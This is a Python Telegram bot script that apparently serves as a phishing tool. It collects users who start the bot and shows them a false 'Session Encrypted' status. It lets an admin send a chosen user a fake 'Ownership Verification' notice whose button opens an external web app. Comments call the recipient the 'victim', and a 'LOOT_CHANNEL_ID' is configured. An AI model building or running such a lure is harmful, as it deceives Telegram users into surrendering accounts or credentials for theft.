import os
import http.server
import socketserver
import threading
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIG ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8699819680
LOOT_CHANNEL_ID = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-auditor/"

user_db = {}

# --- RENDER PORT FIX ---
def start_fake_server():
    with socketserver.TCPServer(("", 10000), http.server.SimpleHTTPRequestHandler) as httpd:
        httpd.serve_forever()
threading.Thread(target=start_fake_server, daemon=True).start()

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username.lower() if user.username else str(user.id)
    user_db[username] = update.effective_chat.id
    
    if user.id == ADMIN_ID:
        await update.message.reply_text("💠 **Admin Active**\nUse `/trigger name` to send audit.")
    else:
        await update.message.reply_text("🛡️ **System Status**: Session Encrypted.")

async def check_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not user_db:
        await update.message.reply_text("📭 Database is empty.")
    else:
        list_str = "\n".join([f"• {u}" for u in user_db.keys()])
        await update.message.reply_text(f"📊 **Stored Users:**\n{list_str}")

async def trigger_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Only allow the Admin to use this
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("❌ Usage: `/trigger username`")
        return

    target = context.args.lower().replace("@", "")
    
    if target in user_db:
        chat_id = user_db[target]
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Verify Authenticity", web_app=WebAppInfo(url=TMA_URL))]])
        
        try:
            # Send to victim
            await context.bot.send_message(
                chat_id=chat_id, 
                text="⚠️ **Administrative Notice: Ownership Verification**\nA routine check is required for your account.",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            # Send confirmation to ADMIN (You)
            await update.message.reply_text(f"🚀 **SUCCESS**: Audit sent to {target}")
        except Exception as e:
            await update.message.reply_text(f"❌ **SEND FAILED**: {str(e)}")
    else:
        # Tell admin if the user isn't found
        await update.message.reply_text(f"❌ '{target}' not in database. Current: {list(user_db.keys())}")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("checkdb", check_database))
    app.add_handler(CommandHandler("trigger", trigger_audit))
    # Clears old stuck messages on start
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
    
